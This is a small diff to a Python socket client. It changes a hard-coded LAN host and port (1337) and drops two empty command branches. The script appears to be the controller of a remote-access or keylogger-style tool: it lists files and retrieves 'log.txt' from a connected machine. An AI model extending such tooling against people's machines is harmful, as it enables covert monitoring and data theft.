@@ -5,7 +5,7 @@ import time
 path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = "192.168.43.85"
+    host = "192.168.43.211"
     port = 1337
 
     try:
@@ -29,10 +29,6 @@ def main():
             soc.connect((host, port))
         if message == 'ls':
             print(soc.recv(5000).decode('utf-8'))
-        if message == 'cd' & len(message) > 3:
-            pass
-        if message == 'dir':
-            pass
         if message == 'logs':
             load_data_from_user(soc, "log.txt")
             time.sleep(3)
